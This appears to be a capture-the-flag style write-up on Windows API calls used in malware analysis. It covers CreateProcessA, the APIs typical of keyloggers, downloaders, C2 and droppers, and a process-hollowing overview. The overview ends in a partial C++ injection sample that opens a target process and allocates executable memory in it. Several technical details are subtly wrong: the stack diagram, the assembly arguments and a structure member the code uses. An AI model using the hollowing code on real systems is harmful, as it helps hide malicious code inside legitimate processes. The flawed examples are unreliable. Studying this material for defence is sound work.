<p><code class="language-plaintext highlighter-rouge">CreateProcessA</code> is a function which creates a new process and its primary thread.</p> <p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" rel="external nofollow noopener" target="_blank">CreateProcessA</a></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreateProcessA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpApplicationName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPSTR</span>                 <span class="n">lpCommandLine</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">BOOL</span>                  <span class="n">bInheritHandles</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>                 <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPVOID</span>                <span class="n">lpEnvironment</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpCurrentDirectory</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">LPSTARTUPINFOA</span>        <span class="n">lpStartupInfo</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>               <span class="n">LPPROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span>
<span class="p">);</span>
</code></pre></div></div> <p>This C code uses <code class="language-plaintext highlighter-rouge">CreateProcessA</code> to launch a new process:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Declare a STARTUPINFO structure to specify window properties for the new process</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    
    <span class="c1">// Declare a PROCESS_INFORMATION structure to receive information about the new process</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

    <span class="c1">// Initialize the STARTUPINFO structure to zero to avoid any garbage values</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
    
    <span class="c1">// Set the cb member of STARTUPINFO to its size, which is required by CreateProcess</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
    
    <span class="c1">// Initialize the PROCESS_INFORMATION structure to zero to avoid any garbage values</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>

    <span class="c1">// Attempt to create a new process to run Notepad</span>
    <span class="c1">// Parameters:</span>
    <span class="c1">// - NULL: Application name is not specified separately</span>
    <span class="c1">// - "C:\\Windows\\notepad.exe": Command line to execute</span>
    <span class="c1">// - NULL, NULL: No special security attributes for the process or its primary thread</span>
    <span class="c1">// - FALSE: New process does not inherit handles from the calling process</span>
    <span class="c1">// - 0: No special creation flags</span>
    <span class="c1">// - NULL, NULL: No environment block or current directory specified</span>
    <span class="c1">// - &amp;si: Pointer to the STARTUPINFO structure</span>
    <span class="c1">// - &amp;pi: Pointer to the PROCESS_INFORMATION structure to receive process information</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">notepad.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="c1">// If CreateProcess fails, print an error message with the error code from GetLastError</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateProcess failed (%d).</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Wait for the Notepad process to complete</span>
    <span class="c1">// Parameters:</span>
    <span class="c1">// - pi.hProcess: Handle to the process to wait for</span>
    <span class="c1">// - INFINITE: Wait indefinitely until the process terminates</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>

    <span class="c1">// Close the handle to the process as it's no longer needed</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
    
    <span class="c1">// Close the handle to the primary thread of the process as it's no longer needed</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

    <span class="c1">// Return 0 to indicate successful execution of the program</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>When compiled into assembly, the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function call looks like this:</p> <pre><code class="language-asm">push 0
lea eax, [esp+10h+StartupInfo]
push eax
lea eax, [esp+14h+ProcessInformation]
push eax
push 0
push 0
push 0
push 0
push 0
push 0
push dword ptr [hWnd]
call CreateProcessA
</code></pre> <p>This assembly code pushes the necessary parameters onto the stack in reverse order and then calls the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function. The <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function then launches a new process and returns a handle to the process and its primary thread.</p> <p>This is what the stack layout looks like after pushing every parameters.</p> <pre><code class="language-raw">+--------------------------+
| lpApplicationName        | &lt;-- esp + 0x00 (NULL)
+--------------------------+
| lpStartupInfo            | &lt;-- esp + 0x04 (address calculated by lea)
+--------------------------+
| lpProcessInformation     | &lt;-- esp + 0x08 (address calculated by lea)
+--------------------------+
| lpCurrentDirectory       | &lt;-- esp + 0x0C (NULL)
+--------------------------+
| lpEnvironment            | &lt;-- esp + 0x10 (NULL)
+--------------------------+
| dwCreationFlags          | &lt;-- esp + 0x14 (0)
+--------------------------+
| bInheritHandles          | &lt;-- esp + 0x18 (FALSE)
+--------------------------+
| lpThreadAttributes       | &lt;-- esp + 0x1C (NULL)
+--------------------------+
| lpProcessAttributes      | &lt;-- esp + 0x20 (NULL)
+--------------------------+
| lpCommandLine            | &lt;-- esp + 0x24 (value from hWnd)
+--------------------------+
</code></pre> <p>During malware analysis, identifying the API call and examining the code can help understand the malware’s purpose.</p> <h3 id="questions-3">Questions</h3> <p><strong>When a process is created in suspended state, which hexadecimal value is assigned to the dwCreationFlags parameter?</strong></p> <p>To know that, we have to read the MSDN documentation available <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" rel="external nofollow noopener" target="_blank">here</a>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x00000004</code></em></p> <h2 id="task-7---common-apis-used-by-malware">Task 7 - Common APIs used by malware</h2> <p>Most malware authors heavily rely on Windows API to accomplish their goals. That is why it is important to know how it is used in different malware variants.</p> <h3 id="keylogger">Keylogger</h3> <p>This type of malware mostly use:</p> <ul> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" rel="external nofollow noopener" target="_blank">SetWindowsHookEx</a></strong>: This function installs an application-defined hook procedure into a hook chain in order to monitor and intercept system events such as keystokes or mouse clicks.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate" rel="external nofollow noopener" target="_blank">GetAsyncKeyState</a></strong>: This function retieves the status of a virtual key (ID used to represent keys of a keyboard) when the function is called, to determine if a key is being pressed or released.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate" rel="external nofollow noopener" target="_blank">GetKeyboardState</a></strong>: This function retrieves the status of all virtual keys to determine the status of all keys on the keyboard.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeynametexta" rel="external nofollow noopener" target="_blank">GetKeyNameText</a></strong>: This function retrieves the name of a key to determine the name of the pressed key.</li> </ul> <h3 id="downloader">Downloader</h3> <p>A downloader is a type of malware designed to download other malware onto a victim’s system.</p> <ul> <li> <strong><a href="https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)" rel="external nofollow noopener" target="_blank">URLDownloadToFile</a></strong>: This function downloads a file from the internet and saves it to a local file. This can be used to fetch additional malicious code or update the malware.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen" rel="external nofollow noopener" target="_blank">WinHttpOpen</a></strong>: This one itnitializes the WinHTTP API, which can be used to establish an HTTP connection to a rogue remote server.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect" rel="external nofollow noopener" target="_blank">WinHttpConnect</a></strong>: It establishes a connection to a remote server.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest" rel="external nofollow noopener" target="_blank">WinHttpOpenRequest</a></strong>: It enables the ability of doing HTTP requests like <em>GET</em> or <em>POST</em>. …</li> </ul> <p>This is an example given by Microsoft to make HTTP requests with this API:</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">BOOL</span>  <span class="n">bResults</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
              <span class="n">hConnect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span>
              <span class="n">hRequest</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// Use WinHttpOpen to obtain a session handle.</span>
    <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span>  <span class="s">L"A WinHTTP Example Program/1.0"</span><span class="p">,</span> 
                             <span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span>
                             <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> 
                             <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Specify an HTTP server.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span>
        <span class="n">hConnect</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span> <span class="n">hSession</span><span class="p">,</span> <span class="s">L"www.wingtiptoys.com"</span><span class="p">,</span>
                                   <span class="n">INTERNET_DEFAULT_HTTP_PORT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create an HTTP Request handle.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span>
        <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span> <span class="n">hConnect</span><span class="p">,</span> <span class="s">L"PUT"</span><span class="p">,</span> 
                                       <span class="s">L"/writetst.txt"</span><span class="p">,</span> 
                                       <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> 
                                       <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span>
                                       <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Send a Request.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> 
        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpSendRequest</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> 
                                       <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span>
                                       <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> 
                                       <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// End the request.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span>
        <span class="n">bResults</span> <span class="o">=</span> <span class="n">WinHttpReceiveResponse</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// Keep checking for data until there is nothing left.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bResults</span><span class="p">)</span>
        <span class="k">do</span> 
        <span class="p">{</span>
            <span class="c1">// Check for available data.</span>
            <span class="n">dwSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwSize</span><span class="p">))</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Error %u in WinHttpQueryDataAvailable.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

            <span class="c1">// Allocate space for the buffer.</span>
            <span class="n">pszOutBuffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">dwSize</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pszOutBuffer</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">dwSize</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="c1">// Read the Data.</span>
                <span class="n">ZeroMemory</span><span class="p">(</span><span class="n">pszOutBuffer</span><span class="p">,</span> <span class="n">dwSize</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WinHttpReadData</span><span class="p">(</span> <span class="n">hRequest</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pszOutBuffer</span><span class="p">,</span> 
                                      <span class="n">dwSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDownloaded</span><span class="p">))</span>
                    <span class="n">printf</span><span class="p">(</span> <span class="s">"Error %u in WinHttpReadData.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">else</span>
                    <span class="n">printf</span><span class="p">(</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pszOutBuffer</span><span class="p">);</span>
            
                <span class="c1">// Free the memory allocated to the buffer.</span>
                <span class="k">delete</span> <span class="p">[]</span> <span class="n">pszOutBuffer</span><span class="p">;</span>
            <span class="p">}</span>

        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">dwSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Report any errors.</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bResults</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span> <span class="s">"Error %d has occurred.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

    <span class="c1">// Close any open handles.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hRequest</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hRequest</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hConnect</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSession</span><span class="p">)</span> <span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span>
</code></pre></div></div> <h3 id="c2-communication">C2 Communication</h3> <p>Command and Control (C2) communication is a method malware uses to communicate with a remote server. This communication can be used to receive commands from the attacker, send stolen data and more.</p> <ul> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena" rel="external nofollow noopener" target="_blank">InternetOpen</a></strong> This function initializes a session for connection to the internet.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla" rel="external nofollow noopener" target="_blank">InternetOpenUrl</a></strong>: This opens a URL for download, like for downloading malicious code or geting data from a C2 Server.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta" rel="external nofollow noopener" target="_blank">HttpOpenRequest</a></strong>: This function opens HTTP request. Malware can use this function to send HTTP requests to a C2 server and receive commands or additional malicious code.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta" rel="external nofollow noopener" target="_blank">HttpSendRequest</a></strong>: This function sends HTTP request to a C2 server. Malware can use this function to send data or receive commands from a C2 server.</li> </ul> <p>Wininet is designed for desktop applications that require user interaction and features like caching and cookie management, while WinHTTP is optimized for server-side applications and automated tasks without user interaction. Besides these differences, both are suitable for communication using the HTTP protocol even if WinHTTP tends to have better performance. C2 Communication and Downloader can both use Wininet and WinHTTP, nevertheless these are shown here to present the usage of different API.</p> <h3 id="data-exfiltration">Data Exfiltration</h3> <p>Data exfiltration is the unauthorized data transfer from an organization to an external destination.</p> <ul> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile" rel="external nofollow noopener" target="_blank">InternetReadFile</a></strong>: This function reads data from an hRequest handle of <code class="language-plaintext highlighter-rouge">HttpSendRequest</code>. Malware can use this function to steal data from a compromised system and transmit it to a C2 server.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpputfilea" rel="external nofollow noopener" target="_blank">FtpPutFile</a></strong>: This function uploads a file to an FTP Server.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="external nofollow noopener" target="_blank">CreateFile</a></strong>: This function creates or opens a file or device to read or modify files containing sensitive information or system configuration data.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile" rel="external nofollow noopener" target="_blank">WriteFile</a></strong>: This function writes data to a file or device.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboarddata" rel="external nofollow noopener" target="_blank">GetClipboardData</a></strong>: This API is used to retrieve data from the clipboard.</li> </ul> <h3 id="dropper">Dropper</h3> <p>A dropper is a malware designed to install other malware onto a victim’s system. Unlike a downloader, a dropper already contains the malicious payload.</p> <ul> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" rel="external nofollow noopener" target="_blank">CreateProcess</a></strong>: This function creates a new process and its primary thread.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" rel="external nofollow noopener" target="_blank">VirtualAlloc</a></strong>: This function allocates a region of memory within the virtual address space of the calling process.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" rel="external nofollow noopener" target="_blank">WriteProcessMemory</a></strong>: This function writes data to an area of memory within the address space of a specified process.</li> </ul> <h3 id="api-hooking">API Hooking</h3> <p>API Hooking is a method malware uses to intercept calls to Windows APIs and modify their behavior. This allows malware to avoid detection by modifying legitimate programs and perform malicious actions.</p> <ul> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" rel="external nofollow noopener" target="_blank">GetProcAddress</a></strong> This function retrieves the address of an exported function or variable from a specified DLL, in order to locate and hook API calls made by other processes.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya" rel="external nofollow noopener" target="_blank">LoadLibrary</a></strong>: This loads a DLL into a process’s address space.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" rel="external nofollow noopener" target="_blank">SetWindowsHookEx</a></strong>: This API installs a hook procedure that monitors messages sent to a window or system event, to intercept calls to other Windows APIs and modify their behavior.</li> </ul> <h3 id="anti-debugging-and-vm-detection">Anti-debugging and VM Detection</h3> <p>Theses techniques are used by malware to evade detection and analysis by security researchers.</p> <ul> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent" rel="external nofollow noopener" target="_blank">IsDebuggerPresent</a></strong>: This function checks whether a process is running under a debugger.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent" rel="external nofollow noopener" target="_blank">CheckRemoteDebuggerPresent</a></strong>: This function checks whether a remote debugger is debugging a process.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" rel="external nofollow noopener" target="_blank">NtQueryInformationProcess</a></strong>: This one retrieves information about a specified process.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount" rel="external nofollow noopener" target="_blank">GetTickCount</a></strong>: This function gets the number of milliseconds that have elapsed since the system was started.</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" rel="external nofollow noopener" target="_blank">GetModuleHandle</a></strong>: This function retrieves a handle to a specified module like VM specific modules (VMWare tools…).</li> <li> <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getsystemmetrics" rel="external nofollow noopener" target="_blank">GetSystemMetrics</a></strong>: This function retrieves various system metrics and configuration settings like CPU Revision or if the current session is a remote one.</li> </ul> <p>Anti-debugging / AV detection are discussed in the <a href="https://tryhackme.com/room/antireverseengineering" rel="external nofollow noopener" target="_blank">Anti-Reverse Engineering</a> room and more APIs used for these or other types of malware are discussed one https://malapi.io/.</p> <h2 id="task-8--process-hollowing-overview">Task 8 Process Hollowing: Overview</h2> <p>Process hollowing is a technique used by malware to inject malicious code into a legitimate process running on a victim’s computer. The process is as follow:</p> <ol> <li>Create a legitimate process like notepad and suspend it. <code class="language-plaintext highlighter-rouge">CreateProcessA()</code>/<code class="language-plaintext highlighter-rouge">NtSuspendProcess()</code> </li> <li>Allocate new memory of the size of the malicious code in the suspended process and write the code into it. <code class="language-plaintext highlighter-rouge">VirtualAllocEx()</code>/<code class="language-plaintext highlighter-rouge">WriteProcessMemory()</code> </li> <li>Modify the entry point of the process to point to the address of the malicious code. <code class="language-plaintext highlighter-rouge">GetThreadContext()</code>/<code class="language-plaintext highlighter-rouge">SetThreadContext()</code> </li> <li>Resume the rogued suspended process in order to execute the malicious code. <code class="language-plaintext highlighter-rouge">NtResumeProcess()</code> </li> <li>Clean up the process and any ressource used.</li> </ol> <p>To get a better understanding of the technique, a sample C++ code is available below:</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="cm">/**
 * HollowProcess - Replaces the code of a target process with that of a source process.
 * @param szSourceProcessName: Path to the source executable.
 * @param szTargetProcessName: Name of the target process to be hollowed.
 * @return: True if the process hollowing was successful, false otherwise.
 */</span>
<span class="kt">bool</span> <span class="nf">HollowProcess</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">szSourceProcessName</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">szTargetProcessName</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// Take a snapshot of all processes in the system</span>
    <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
    <span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// Iterate over the process list to find the target process</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">do</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="n">szTargetProcessName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="c1">// Open the target process with all access rights</span>
                <span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">IMAGE_DOS_HEADER</span> <span class="n">idh</span><span class="p">;</span>
                <span class="n">IMAGE_NT_HEADERS</span> <span class="n">inth</span><span class="p">;</span>
                <span class="n">IMAGE_SECTION_HEADER</span> <span class="n">ish</span><span class="p">;</span>

                <span class="n">DWORD</span> <span class="n">dwRead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

                <span class="c1">// Read the DOS header and NT headers of the target process</span>
                <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idh</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">idh</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>
                <span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">idh</span><span class="p">.</span><span class="n">e_lfanew</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inth</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inth</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">);</span>

                <span class="c1">// Allocate memory in the target process for the source image</span>
                <span class="n">LPVOID</span> <span class="n">lpBaseAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lpBaseAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
                <span class="p">{</span>
